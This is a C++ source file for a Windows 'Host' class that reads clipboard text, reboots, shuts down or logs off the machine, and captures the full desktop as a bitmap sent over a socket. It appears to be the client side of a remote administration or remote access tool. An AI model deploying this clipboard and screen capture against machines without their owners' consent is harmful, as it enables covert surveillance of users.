#include "host.h"

std::string Host::getClipBoard(){
    HANDLE handle;
    std::string buf;
    CHAR *buffer = nullptr;
    if(OpenClipboard(nullptr)){
        handle = GetClipboardData(CF_TEXT);
        buffer =(CHAR*)GlobalLock(handle);
        buf = buffer;
        GlobalUnlock(handle);
        CloseClipboard();
    }
    return buf;
}

bool Host::reboot(){
    if(priv.setShutdownPriv())
        return ExitWindowsEx(EWX_REBOOT, 0);
    return false;
}

bool Host::powerOff(){
    if(priv.setShutdownPriv())
        return ExitWindowsEx(EWX_SHUTDOWN, 0);
    return false;
}

bool Host::logonOff(){
    if(priv.setShutdownPriv())
        return ExitWindowsEx(EWX_LOGOFF, 0);
    return false;
}

size_t Host::packFile(BYTE *data, BYTE *fileHeader, BYTE *fileInfo, BYTE *dataBits, DWORD fheader, DWORD finfo, DWORD bits){
    DWORD j = 0;
    for(DWORD i = 0; i < fheader; i++)
        data[i] = fileHeader[i];
    j = fheader;
    for(DWORD i = 0; i < finfo; i++)
        data[j++] = fileInfo[i];
    j = fheader + finfo;
    for(DWORD i = 0; i < bits; i++)
        data[j++] = dataBits[i];
    return (fheader + finfo + bits);
}

void Host::screenShot(SOCKET s){
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG w, h;
    BYTE *bBits = nullptr;
    BYTE *data = nullptr;
    DWORD cbBits = 0;
    DWORD len = 0;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
    hDC = GetDC(nullptr);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
    w = bAllDesktops.bmWidth;
    h = bAllDesktops.bmHeight;
    DeleteObject(hTempBitmap);
    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = w;
    biHeader.biHeight = h;
    bInfo.bmiHeader = biHeader;
    cbBits = (((24 * w + 31)&~31) / 8) * h;
    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, nullptr, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, w, h, hDC, x, y, SRCCOPY);
    data = new BYTE[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + cbBits];
    len = packFile(data, (BYTE*)&bfHeader, (BYTE*)&biHeader, bBits, sizeof(bfHeader), sizeof(biHeader), cbBits);
    send(s, (char*)data, len, 0);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);
    delete[] data;
}
